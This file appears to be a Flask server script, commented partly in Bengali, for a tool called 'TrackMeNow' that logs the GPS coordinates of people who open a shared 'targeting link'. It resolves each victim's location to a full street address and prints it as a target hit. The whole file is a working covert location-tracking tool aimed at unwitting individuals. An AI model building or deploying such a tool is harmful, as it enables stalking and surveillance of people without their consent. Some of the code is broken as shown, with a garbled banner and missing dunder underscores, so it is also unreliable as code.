import os
import subprocess
from flask import Flask, render_template, request, jsonify
from geopy.geocoders import Nominatim

app = Flask(name)

# Geopy OSINT Module Configuration
geolocator = Nominatim(user_agent="TrackMeNow_OSINT_Engine")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/update_location', methods=['POST'])
def update_location():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        latitude = data.get('latitude')
        longitude = data.get('longitude')

        if latitude and longitude:
            # লাইভ ডাটা ইন্টারসেপশন অ্যালার্ট এবং লগিং
            print("\n" + "="*50)
            print(f"[+] TARGET INTERACTION DETECTED!")
            print(f"[*] Latitude  : {latitude}")
            print(f"[*] Longitude : {longitude}")
            print(f"[*] Maps Link : https://maps.google.com/?q={latitude},{longitude}")
            
            # Geopy ব্যবহার করে অক্ষাংশ-দ্রাঘিমাংশ থেকে সম্পূর্ণ ঠিকানা বের করা
            try:
                location = geolocator.reverse((latitude, longitude), timeout=10)
                if location:
                    print(f"[+] Full Address: {location.address}")
                else:
                    print("[-] Address: Unable to resolve street name.")
            except Exception as geo_err:
                print(f"[-] Geocoding Error: {str(geo_err)}")
            print("="*50 + "\n")
            
            return jsonify({"status": "success", "message": "Payload delivered"}), 200
        else:
            return jsonify({"status": "error", "message": "Missing coordinates"}), 400

    except Exception as e:
        print(f"[-] Server Error: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

if name == 'main':
    # আপনার সেই প্রিয় আসল ওল্ড স্কুলের সবুজ হ্যাকিং ব্যানার ইন্টারফেস
    print("\033[92m" + "="*50)
    print("""
  _ __    _     _    ___ _   _   _    _ 
 |_   _|  _ \  / \  / _| |/ /  \/  | __| \ | |/ \  / |
   | | | |_) |/ _ \| |   | ' /| |\/| |  _| |  \| / _ \ | |
   | | |  _ </ _ \ |_| . \| |  | | |_| |\  / _ \| |
   |_| |_| \_/_/   \_\__|_|\_\_|  |_|___|_| \_/_/   \_\_|
    """)
    print(" [*] Secure OSINT Location Tracking Engine v1.0.3 [*]")
    print("="*50 + "\033[0m")
    
    print("\033[94m[*] Initializing Systems...")
    print("[+] Framework status: ACTIVE and Listening for targets...\033[0m")
    print("\n\033[93m===========[ TARGETING LINKS ]===========\033[0m")
    print(" LOCAL ACCESS  : http://127.0.0.1:5000")
    print(" LAN CAPTURE   : http://100.73.179.109:5000")
    print("\033[93m=========================================\033[0m")
    print("\n[*] Live logs will stream down below...\n")

    # টানেলিং সার্ভিসের সাথে সামঞ্জস্য রাখার জন্য SSL ছাড়া স্ট্যান্ডার্ড HTTP মোডে রান করা হলো
    app.run(
        host='0.0.0.0', 
        port=5000, 
        debug=True,
        load_dotenv=False
    )